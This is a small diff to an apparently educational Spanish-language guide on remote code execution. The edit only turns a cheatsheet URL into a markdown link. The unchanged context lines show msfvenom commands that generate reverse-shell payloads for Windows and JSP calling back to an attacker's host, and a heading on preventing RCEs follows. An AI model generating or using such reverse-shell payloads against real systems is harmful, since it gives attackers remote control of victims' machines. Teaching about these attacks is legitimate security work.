@@ -152,9 +152,7 @@ msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp L
 msfvenom -p windows/shell_reverse_tcp lhost=<local-ip> lport=PORT -f jsp -o revshell.jsp  # JAVA file
 ```
 
-Si quereis saber más a cerca de estos payloads podeis mirar la siguiente cheatsheet el cual es una de las mejores actualmente en cuanto a reverse shells:
-
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php
+Si quereis saber más a cerca de estos payloads podeis mirar esta [cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php) el cual es una de las mejores actualmente en cuanto a reverse shells.
 
 # __Como prevenirse frente a RCEs__
 
